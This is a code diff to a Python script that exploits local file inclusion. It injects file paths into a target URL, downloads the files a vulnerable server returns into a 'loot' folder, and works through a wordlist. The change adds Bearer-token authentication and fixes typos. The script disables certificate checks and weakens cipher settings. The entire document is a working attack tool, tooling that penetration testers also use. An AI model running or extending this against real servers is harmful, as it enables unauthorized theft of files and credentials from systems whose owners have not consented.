@@ -9,10 +9,9 @@ import os
 import requests
 from rich.progress import track
 
-
-def remote_lfi(filepath, url):
+def remote_lfi(filepath, url, headers=None):
     data = {"path": filepath, "success": False, "content": ""}
-    r = requests.get(url.replace("LFIPATH", filepath), verify=False)
+    r = requests.get(url.replace("LFIPATH", filepath), verify=False, headers=headers)
     ## Extract data here
     filecontent = r.content
     ##
@@ -21,8 +20,7 @@ def remote_lfi(filepath, url):
         data["content"] = filecontent
     return data
 
-
-def dump_file(basepath, filepath, url, only_success=False):
+def dump_file(basepath, filepath, url, headers=None, only_success=False):
     def b_filesize(file):
         l = len(file['content'])
         units = ['B', 'kB', 'MB', 'GB', 'TB', 'PB']
@@ -31,7 +29,7 @@ def dump_file(basepath, filepath, url, only_success=False):
                 break
         return "%4.2f %s" % (round(l / (1024 ** k), 2), units[k])
     #
-    file = remote_lfi(filepath, url)
+    file = remote_lfi(filepath, url, headers=headers)
     if file['success'] == True:
         print('\x1b[92m[+] (%9s) %s\x1b[0m' % (b_filesize(file), filepath))
         dir = basepath + os.path.dirname(file['path'])
@@ -46,13 +44,11 @@ def dump_file(basepath, filepath, url, only_success=False):
             print('\x1b[91m[!] (%s) %s\x1b[0m' % ("==error==", filepath))
         return False
 
-
 def load_wordlist(filelist):
     f = open(filelist, 'r')
     list_of_files = [l.strip() for l in f.readlines() if len(l.strip()) != 0]
     f.close()
     return list_of_files
-
 
 def parseArgs():
     parser = argparse.ArgumentParser(description="Description message")
@@ -66,14 +62,15 @@ def parseArgs():
 
     parser.add_argument("-D", "--dump-dir", dest="dump_dir", action="store", type=str, default="./loot/", required=False, help="Directory where the dumped files will be stored.")
     parser.add_argument("-k", "--insecure", dest="insecure_tls", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")
-    return parser.parse_args()
+    parser.add_argument("--auth-header", dest="auth_header", action="store", type=str, required=False, help="Authorization header value (Bearer token).")
 
+    return parser.parse_args()
 
 if __name__ == '__main__':
     options = parseArgs()
 
     if options.insecure_tls:
-        # Disable warings of insecure connection for invalid cerificates
+        # Disable warnings of insecure connection for invalid certificates
         requests.packages.urllib3.disable_warnings()
         # Allow use of deprecated and weak cipher methods
         requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
@@ -82,12 +79,14 @@ if __name__ == '__main__':
         except AttributeError:
             pass
 
+    headers = {"Authorization": f"Bearer {options.auth_header}"} if options.auth_header else None
+
     if options.filelist:
         if os.path.exists(options.filelist):
             list_of_files = load_wordlist(options.filelist)
             for file in track(list_of_files):
-                dump_file(options.dump_dir, file, options.url, only_success=options.only_success)
+                dump_file(options.dump_dir, file, options.url, headers=headers, only_success=options.only_success)
         else:
             print('\x1b[91m[!] Cannot read file %s\x1b[0m' % options.filelist)
     elif options.file:
-        dump_file(options.dump_dir, options.file, options.url, only_success=options.only_success)
+        dump_file(options.dump_dir, options.file, options.url, headers=headers, only_success=options.only_success)
